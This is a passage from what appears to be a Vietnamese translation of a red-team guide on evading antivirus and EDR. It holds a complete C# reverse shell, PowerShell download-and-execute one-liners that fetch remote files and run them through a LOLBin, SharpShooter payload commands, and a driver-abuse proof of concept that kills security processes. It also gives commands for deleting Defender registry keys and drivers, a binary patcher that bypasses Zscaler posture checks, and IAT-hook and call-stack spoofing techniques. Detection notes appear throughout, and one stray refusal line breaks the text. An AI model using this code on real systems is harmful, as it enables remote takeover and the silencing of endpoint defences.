// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# sử dụng trình biên dịch

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Tự động tải xuống và thực thi:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Danh sách C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ví dụ sử dụng python để tạo injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Các công cụ khác

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Thêm

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Vô hiệu hóa AV/EDR từ Kernel Space

Storm-2603 đã sử dụng một tiện ích console nhỏ có tên **Antivirus Terminator** để vô hiệu hóa các biện pháp bảo vệ endpoint trước khi phát tán ransomware. Công cụ này mang theo **driver dễ bị tổn thương nhưng *đã ký* của riêng nó** và lạm dụng driver đó để thực hiện các thao tác kernel có đặc quyền mà ngay cả các dịch vụ AV Protected-Process-Light (PPL) cũng không thể ngăn chặn.<sup>[[12]](#references)</sup>

Điểm chính cần nhớ
1. **Driver đã ký**: Tệp được đưa lên ổ đĩa là `ServiceMouse.sys`, nhưng binary thực chất là driver `AToolsKrnl64.sys` được Antiy Labs ký hợp lệ, thuộc “System In-Depth Analysis Toolkit”. Vì driver có chữ ký Microsoft hợp lệ nên nó được tải ngay cả khi Driver-Signature-Enforcement (DSE) đang bật.
2. **Cài đặt service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Dòng đầu tiên đăng ký driver dưới dạng **dịch vụ kernel** và dòng thứ hai khởi chạy dịch vụ để `\\.\ServiceMouse` có thể truy cập từ userland.
3. **Các IOCTL do driver cung cấp**
   | Mã IOCTL | Khả năng                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Chấm dứt một tiến trình bất kỳ bằng PID (dùng để dừng các dịch vụ Defender/EDR) |
   | `0x990000D0` | Xóa một tệp bất kỳ trên ổ đĩa |
   | `0x990001D0` | Gỡ tải driver và xóa dịch vụ |

   Proof-of-concept C tối giản:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Vì sao hiệu quả**: BYOVD bỏ qua hoàn toàn các biện pháp bảo vệ user-mode; mã chạy trong kernel có thể mở các tiến trình *được bảo vệ*, chấm dứt chúng hoặc can thiệp vào các đối tượng kernel, bất kể PPL/PP, ELAM hay các tính năng hardening khác.

Phát hiện / Giảm thiểu
•  Bật danh sách chặn driver dễ bị tấn công của Microsoft (`HVCI`, `Smart App Control`) để Windows từ chối tải `AToolsKrnl64.sys`.
•  Giám sát việc tạo các dịch vụ *kernel* mới và cảnh báo khi driver được tải từ thư mục cho phép ghi với mọi người dùng hoặc không có trong allow-list.
•  Theo dõi các handle user-mode tới đối tượng thiết bị tùy chỉnh, sau đó là các lệnh gọi `DeviceIoControl` đáng ngờ.

### Bỏ qua các bước kiểm tra tư thế thiết bị của Zscaler Client Connector bằng cách vá nhị phân trên đĩa

**Client Connector** của Zscaler áp dụng các quy tắc tư thế thiết bị cục bộ và dựa vào Windows RPC để truyền kết quả cho các thành phần khác. Hai lựa chọn thiết kế yếu khiến việc bypass hoàn toàn trở nên khả thi:

1. Việc đánh giá tư thế thiết bị diễn ra **hoàn toàn ở phía client** (một giá trị boolean được gửi tới server).
2. Các endpoint RPC nội bộ chỉ xác thực rằng executable kết nối được **Zscaler ký** (thông qua `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Bằng cách **vá bốn binary đã ký trên đĩa**, có thể vô hiệu hóa cả hai cơ chế:

| Binary | Logic ban đầu được vá | Kết quả |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Luôn trả về `1` để mọi lần kiểm tra đều đạt yêu cầu |
| `ZSAService.exe` | Lệnh gọi gián tiếp tới `WinVerifyTrust` | Bị thay bằng NOP ⇒ mọi tiến trình (kể cả chưa ký) đều có thể kết nối với các RPC pipe |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Được thay bằng `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Các bước kiểm tra tính toàn vẹn của tunnel | Bị bỏ qua |

Trích đoạn patcher tối giản:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Sau khi thay thế các tệp gốc và khởi động lại service stack:

* **Tất cả** các kiểm tra posture đều hiển thị **đạt/tuân thủ**.
* Các binary chưa ký hoặc đã bị sửa đổi có thể mở các endpoint RPC named-pipe (ví dụ: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host bị xâm nhập có quyền truy cập không hạn chế vào mạng nội bộ được xác định bởi các policy của Zscaler.

Case study này cho thấy các quyết định tin cậy hoàn toàn phía client và những kiểm tra chữ ký đơn giản có thể bị vượt qua chỉ bằng một vài byte patch.

## Lạm dụng chức năng đáng tin cậy của Microsoft Defender `BTR.sys`

Driver **Boot-Time Removal** của Defender là một ví dụ đối lập hữu ích với BYOVD truyền thống. `BTR.sys` là một thành phần remediation hợp lệ do Microsoft ký, không có lỗi memory-corruption và không có giao diện IOCTL; thay vào đó, sau khi có được quyền administrator và `SeLoadDriverPrivilege`, operator có thể giả mạo transaction remediation riêng của driver để thực hiện các thao tác file/registry Ring-0 vốn được thiết kế sẵn. Đây là **primitive vô hiệu hóa AV/EDR sau khi xâm nhập, không phải initial access hay privilege escalation**, và có thể trích xuất driver từ resource `BOOTTIMETOOL` trong `MpEngine.dll` của chính mục tiêu, thay vì đưa vào một driver bên thứ ba dễ gây chú ý.<sup>[[36]](#references)</sup>

### Chuẩn bị driver chạy một lần

Defender thường ghi resource ra dưới dạng tệp `[a-z]{8}.sys` ngẫu nhiên và đăng ký kernel service có tên tương tự. `DriverEntry` đọc giá trị `Args` của service, mở NTFS ADS được tham chiếu, giải mã và xác thực danh sách hành động, ghi feedback, rồi trả về `0xC0000056` (`STATUS_DELETE_PENDING`) sau khi thực thi thành công để driver được unload thay vì tiếp tục nằm trong bộ nhớ. Một service giả mạo có các giá trị đặc trưng sau.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Luồng `:changelist` chứa một blob được mã hóa bằng RC4. Các bản dựng được phân tích sử dụng lại khóa cố định dài 256 byte, vì vậy mã hóa không phải là ranh giới phân quyền. Plaintext hợp lệ có header toàn cục dài 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC của header và transaction ID được tạo từ payload), theo sau là đường dẫn feedback UTF-16 kết thúc bằng null và bất kỳ số lượng item nào. Mỗi item có header dài 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) cùng dữ liệu riêng theo action, kết thúc bằng **chính xác bốn byte NUL**. Mỗi vùng header/dữ liệu được kiểm tra độc lập bằng CRC-32 với đa thức `0xEDB88320`, trạng thái ban đầu là `0xFFFFFFFF` và **không XOR cuối** (`~CRC32`); trạng thái CRC được đặt lại cho từng vùng.<sup>[[36]](#references)[[37]](#references)</sup>

Các ID action được chấp nhận cho phép sử dụng những primitive kernel sau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dữ liệu item | Kết quả |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Xóa file, kể cả file đang bị khóa |
| 2 | `[UTF-16 path]` | Xóa thư mục rỗng |
| 3 | `[Flags][source][destination]` | Di chuyển file đến đường dẫn được bảo vệ do attacker chọn; destination rỗng nghĩa là xóa |
| 4 | `[Flags][key path]` | Xóa đệ quy một registry key |
| 5 | `[Flags][key path + "\\" + value]` | Xóa một registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Tạo/cập nhật một registry value và tạo các key path còn thiếu |

Với action 5 và 6, dấu phân cách key/value trên dây là **hai dấu gạch chéo ngược liên tiếp**; đường dẫn được định dạng theo quy ước sẽ không được tách đúng. File feedback chủ yếu phản ánh request, nhưng bốn byte dữ liệu đầu tiên của mỗi item sẽ trở thành `NTSTATUS` kết quả. Với action 1 và 2, vốn không có trường flags ở đầu, BTR chuyển path vào bốn byte dự trữ ở cuối để dành chỗ cho status đó.<sup>[[36]](#references)</sup>

### Quy trình `BTR_CLI` và cửa sổ khởi động sớm

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) triển khai toàn bộ chuỗi: trích xuất `BTR.sys` từ Defender trên máy cục bộ, tạo `<random>.sys:changelist` cùng một luồng feedback, tuần tự hóa/tính checksum/mã hóa các action liên kết, trực tiếp tạo service registry key, sau đó gọi `NtLoadDriver` với `-trigger now` hoặc để driver chạy lúc hệ thống khởi động với `-trigger boot`. Staging trực tiếp trong registry tránh đường đi `CreateServiceW` thông thường của SCM, do đó **không tạo ra Event ID 7045 khi cài service**. Các artifact được kích hoạt lúc khởi động có thể được gỡ sau đó bằng `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` không khả dụng vì BTR thực hiện I/O tệp từ `DriverEntry` trước khi storage stack và liên kết `SystemRoot` sẵn sàng. `Start=1` kết hợp với nhóm ưu tiên cao `Boot Bus Extender` sẽ thực thi trong Phase 1: NTFS đã khả dụng, nhưng nhiều security driver khởi động cùng hệ thống và dịch vụ EDR ở user-mode chưa khởi tạo. Các filter khởi động cùng hệ thống như `WdFilter` có thể đã được tải, nhưng BTR có thể xóa binary hoặc cấu hình dịch vụ của chúng trước lần khởi động tiếp theo, đồng thời xóa executable của dịch vụ trước khi SCM khởi chạy chúng. ELAM không khắc phục được khoảng trống này vì BTR chạy sau khi đánh giá các thành phần khởi động và có chữ ký Microsoft hợp lệ.<sup>[[36]](#references)</sup>

Nhiều hành động được thực thi trong cùng một giao dịch. PoC thêm Action 1 vào đầu danh sách cho đường dẫn hard-code `\SystemRoot\Temp\BootClean.log`: BTR tạo log này, sau đó xử lý yêu cầu xóa của chính nó và xóa log trước khi unload. Việc này giảm dấu vết, còn lưu phản hồi trong `<random>.sys:<random>.dat` cho phép xóa driver và cả hai stream cùng lúc.<sup>[[36]](#references)[[37]](#references)</sup>

### Các tương quan phát hiện có tín hiệu cao

Các rule chỉ dựa trên chữ ký và Microsoft vulnerable-driver blocklist không ngăn được việc lạm dụng chức năng vốn có của BTR. Hãy ưu tiên các tương quan hành vi sau, đồng thời phân biệt nguồn gốc hợp lệ từ Defender với một launcher bất kỳ.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Tạo `.sys:changelist` là hành vi luôn có khi BTR staging. ADS `.dat` gắn với cùng `.sys` đặc biệt đáng ngờ vì Defender hợp lệ thường lưu feedback bên dưới `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 không có System 7045:** Tương quan việc tạo trực tiếp `HKLM\SYSTEM\CurrentControlSet\Services\<random>` có `Args=...:changelist` và `Group=Boot Bus Extender` với việc không có sự kiện cài đặt SCM tương ứng.
- **Sysmon 6 -> 23:** Tương quan việc tải BTR driver đã biết từ nguồn gốc không phải Defender với thao tác xóa tệp tiếp theo do `System`/PID 4 thực hiện, đặc biệt là với các binary bảo mật.
- **Sysmon 11 -> 23:** Cảnh báo khi `System`/PID 4 nhanh chóng tạo rồi xóa `\SystemRoot\Temp\BootClean.log`.
- Hạn chế và kiểm tra việc cấp/bật `SeLoadDriverPrivilege`; chỉ có chữ ký Microsoft không đủ để tin cậy khi driver của công cụ bảo mật được staging bởi `cmd.exe`, PowerShell hoặc một tiến trình không xác định.

## Lạm dụng Protected Process Light (PPL) để can thiệp AV/EDR bằng LOLBINs

Protected Process Light (PPL) áp dụng hệ thống phân cấp signer/level, theo đó chỉ các tiến trình được bảo vệ có mức ngang bằng hoặc cao hơn mới có thể can thiệp lẫn nhau. Về mặt tấn công, nếu có thể khởi chạy hợp lệ một binary hỗ trợ PPL và kiểm soát các đối số của nó, bạn có thể biến chức năng lành tính (ví dụ: ghi log) thành một primitive ghi có giới hạn, được PPL bảo vệ, nhắm vào các thư mục được bảo vệ mà AV/EDR sử dụng.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Điều gì khiến một tiến trình chạy dưới dạng PPL
- EXE đích (và mọi DLL được tải) phải được ký bằng EKU hỗ trợ PPL.
- Tiến trình phải được tạo bằng CreateProcess với các flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Phải yêu cầu protection level tương thích với signer của binary (ví dụ: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` cho signer anti-malware, `PROTECTION_LEVEL_WINDOWS` cho signer Windows). Mức không phù hợp sẽ khiến thao tác tạo tiến trình thất bại.

Xem thêm phần giới thiệu tổng quan về PP/PPL và bảo vệ LSASS tại đây:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Công cụ launcher
- Công cụ hỗ trợ mã nguồn mở: CreateProcessAsPPL (chọn protection level và chuyển tiếp các đối số tới EXE đích):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Cách sử dụng:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Tôi không thể dịch hướng dẫn thao tác nhằm vượt qua cơ chế bảo vệ antivirus và làm hỏng tệp của nó. Tôi có thể giúp chuyển nội dung này thành bản tóm tắt phòng thủ, tập trung vào cách phát hiện và giảm thiểu rủi ro.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Ghi chú và giới hạn
- Bạn không thể kiểm soát nội dung mà ClipUp ghi ngoài vị trí ghi; primitive này phù hợp để làm hỏng dữ liệu hơn là chèn nội dung chính xác.
- Cần quyền local admin/SYSTEM để cài đặt/khởi động service và cần có thời gian reboot.
- Thời điểm rất quan trọng: target không được mở; thực thi lúc khởi động giúp tránh khóa tệp.

Phát hiện
- Tạo process `ClipUp.exe` với các đối số bất thường, đặc biệt khi process cha là launcher không tiêu chuẩn, gần thời điểm khởi động.
- Service mới được cấu hình để tự khởi động các binary đáng ngờ và luôn khởi động trước Defender/AV. Điều tra việc tạo/sửa đổi service trước các sự cố khởi động Defender.
- Giám sát tính toàn vẹn tệp của các binary/thư mục Platform của Defender; phát hiện các process có cờ protected-process tạo/sửa đổi tệp bất thường.
- Telemetry ETW/EDR: tìm các process được tạo bằng `CREATE_PROTECTED_PROCESS` và việc sử dụng mức PPL bất thường bởi các binary không thuộc AV.

Biện pháp giảm thiểu
- WDAC/Code Integrity: giới hạn các binary đã ký nào được phép chạy dưới dạng PPL và dưới những process cha nào; chặn việc gọi ClipUp ngoài các ngữ cảnh hợp lệ.
- Quản lý service: hạn chế việc tạo/sửa đổi các service tự khởi động và giám sát việc thao túng thứ tự khởi động.
- Đảm bảo đã bật tamper protection và các biện pháp bảo vệ khởi chạy sớm của Defender; điều tra các lỗi khởi động cho thấy binary bị hỏng.
- Cân nhắc tắt tính năng tạo tên ngắn 8.3 trên các volume lưu trữ công cụ bảo mật nếu tương thích với môi trường của bạn (kiểm thử kỹ).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chọn platform để chạy bằng cách liệt kê các thư mục con trong:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Nó chọn thư mục con có chuỗi phiên bản theo thứ tự từ điển cao nhất (ví dụ: `4.18.25070.5-0`), sau đó khởi chạy các process service của Defender từ đó (đồng thời cập nhật các đường dẫn service/registry). Việc chọn này tin cậy các mục thư mục, bao gồm cả directory reparse point (symlink). Quản trị viên có thể lợi dụng điều này để chuyển hướng Defender đến một đường dẫn mà attacker có thể ghi vào, từ đó thực hiện DLL sideloading hoặc làm gián đoạn service.<sup>[[21]](#references)[[22]](#references)</sup>

Điều kiện tiên quyết
- Local Administrator (cần thiết để tạo thư mục/symlink trong thư mục Platform)
- Có thể reboot hoặc kích hoạt việc Defender chọn lại platform (khởi động lại service khi boot)
- Chỉ cần các công cụ có sẵn (mklink)

Vì sao cách này hiệu quả
- Defender chặn việc ghi vào các thư mục của chính nó, nhưng việc chọn platform lại tin cậy các mục thư mục và chọn phiên bản cao nhất theo thứ tự từ điển mà không xác thực target có trỏ đến một đường dẫn được bảo vệ/đáng tin cậy hay không.

Từng bước (ví dụ)
1) Chuẩn bị một bản sao có thể ghi của thư mục platform hiện tại, ví dụ: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tạo một symlink thư mục phiên bản cao hơn bên trong Platform trỏ đến thư mục của bạn:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Lựa chọn trigger (khuyến nghị khởi động lại):
```cmd
shutdown /r /t 0
```
4) Xác minh MsMpEng.exe (WinDefend) chạy từ đường dẫn được chuyển hướng:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Bạn nên kiểm tra đường dẫn tiến trình mới trong `C:\TMP\AV\` và cấu hình service/registry để xác nhận chúng phản ánh vị trí đó.

Các tùy chọn post-exploitation
- DLL sideloading/code execution: Thả/thay thế các DLL mà Defender tải từ thư mục ứng dụng của nó để thực thi code trong các tiến trình của Defender. Xem phần bên trên: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Xóa version-symlink để khi khởi động lần tới, đường dẫn đã cấu hình không thể được phân giải và Defender không khởi động được:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Lưu ý rằng bản thân kỹ thuật này không cung cấp khả năng leo thang đặc quyền; kỹ thuật này yêu cầu quyền admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team có thể chuyển hoạt động né tránh lúc runtime ra khỏi C2 implant và vào chính module đích bằng cách hook Import Address Table (IAT) của module đó, rồi định tuyến các API được chọn qua mã position-independent code (PIC) do attacker kiểm soát. Cách này mở rộng khả năng né tránh vượt ra ngoài phạm vi API nhỏ mà nhiều kit cung cấp (ví dụ: CreateProcessA), đồng thời áp dụng các biện pháp bảo vệ tương tự cho BOF và DLL hậu khai thác.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Phương pháp tổng quan
- Stage một PIC blob cùng với module đích bằng reflective loader (đặt phía trước hoặc đi kèm). PIC phải độc lập và position-independent.
- Khi host DLL được load, duyệt IMAGE_IMPORT_DESCRIPTOR của nó và patch các mục IAT của những import được nhắm tới (ví dụ: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) để trỏ đến các wrapper PIC gọn nhẹ.
- Mỗi wrapper PIC thực hiện các biện pháp né tránh trước khi tail-call đến địa chỉ API thực. Các biện pháp né tránh thường dùng gồm:
  - Mask/unmask bộ nhớ quanh lệnh gọi (ví dụ: mã hóa các vùng beacon, chuyển RWX→RX, thay đổi tên/quyền của trang bộ nhớ), sau đó khôi phục sau lệnh gọi.
  - Call-stack spoofing: tạo một stack trông vô hại rồi chuyển sang API đích để phân tích call-stack trả về các frame như dự kiến.<sup>[[9]](#references)</sup>
- Để đảm bảo tương thích, export một interface để script Aggressor (hoặc thành phần tương đương) có thể đăng ký các API cần hook cho Beacon, BOF và DLL hậu khai thác.

Vì sao dùng IAT hooking ở đây
- Hoạt động với mọi code sử dụng import đã hook, không cần chỉnh sửa code của tool hoặc dựa vào Beacon để proxy các API cụ thể.
- Hỗ trợ DLL hậu khai thác: hook LoadLibrary* cho phép bạn chặn việc load module (ví dụ: System.Management.Automation.dll, clr.dll) và áp dụng cùng biện pháp mask/né tránh stack cho các lệnh gọi API của chúng.
- Khôi phục khả năng sử dụng đáng tin cậy các lệnh hậu khai thác tạo process trước những cơ chế phát hiện dựa trên call-stack bằng cách bọc CreateProcessA/W.

Phác thảo IAT hook tối giản (pseudocode C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Ghi chú
- Áp dụng bản vá sau relocations/ASLR và trước lần đầu sử dụng import. Reflective loader như TitanLdr/AceLdr minh họa việc hooking trong DllMain của module đã nạp.
- Giữ wrapper thật nhỏ và an toàn với PIC; phân giải API thực qua giá trị IAT gốc đã lưu trước khi patch hoặc qua LdrGetProcedureAddress.
- Dùng chuyển đổi RW → RX cho PIC và tránh để lại các trang vừa writable vừa executable.

Stub giả mạo call stack
- Stub PIC kiểu Draugr tạo chuỗi gọi giả (địa chỉ trả về nằm trong các module lành tính), sau đó chuyển luồng điều khiển vào API thực.
- Cách này đánh lừa các cơ chế phát hiện mong đợi stack chuẩn từ Beacon/BOF khi gọi các API nhạy cảm.
- Kết hợp với kỹ thuật cắt stack/ghép stack để luồng thực thi đi vào các frame mong đợi trước prologue của API.

Tích hợp vận hành
- Đặt reflective loader ở đầu các DLL post-ex để PIC và hook tự khởi tạo khi DLL được nạp.
- Dùng script Aggressor để đăng ký các API đích, giúp Beacon và BOF tự động hưởng lợi từ cùng một đường né tránh mà không cần sửa code.

Các cân nhắc về phát hiện/DFIR
- Tính toàn vẹn IAT: các entry phân giải đến địa chỉ không thuộc image (heap/anon); xác minh định kỳ các con trỏ import.
- Bất thường stack: địa chỉ trả về không thuộc image đã nạp; chuyển tiếp đột ngột sang PIC không thuộc image; nguồn gốc RtlUserThreadStart không nhất quán.
- Telemetry của loader: ghi vào IAT trong tiến trình; hoạt động sớm trong DllMain làm thay đổi import thunk; các vùng RX bất thường được tạo lúc nạp.
- Né tránh image-load: nếu hooking LoadLibrary*, hãy giám sát các lần nạp đáng ngờ automation/assembly CLR có tương quan với sự kiện che giấu bộ nhớ.

Các khối xây dựng và ví dụ liên quan
- Reflective loader thực hiện IAT patching trong lúc nạp (ví dụ: TitanLdr, AceLdr)
- Hook che giấu bộ nhớ (ví dụ: simplehook) và PIC cắt stack (stackcutting)
- Stub PIC giả mạo call stack (ví dụ: Draugr)


## IAT Hooking lúc Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hook lúc import thông qua PICO thường trú

Nếu kiểm soát reflective loader, bạn có thể hook import **trong lúc** `ProcessImports()` bằng cách thay con trỏ `GetProcAddress` của loader bằng một resolver tùy chỉnh, trước tiên kiểm tra hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

